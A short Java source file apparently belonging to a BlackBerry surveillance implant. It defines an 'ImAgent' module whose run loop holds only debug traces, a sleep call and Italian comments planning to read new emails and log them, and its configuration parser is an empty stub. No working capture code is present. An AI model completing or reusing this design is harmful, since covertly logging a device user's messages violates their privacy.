package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ImAgent extends Agent {
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);

    private int timeToSleep = 1000;

    public ImAgent(int AgentStatus) {
        super(Agent.AGENT_IM, AgentStatus, true);
    }

    protected ImAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");

        int loop = 0;

        for (;;) {
            debug.trace("loop:" + loop);
            ++loop;

            // verifica che ci siano email *nuove* da leggere

            // per ogni email da leggere

            // genera un log con la email

            if (AgentSleep(timeToSleep)) {
                debug.trace(loop + " clean stop");
                return;
            }
        }
    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
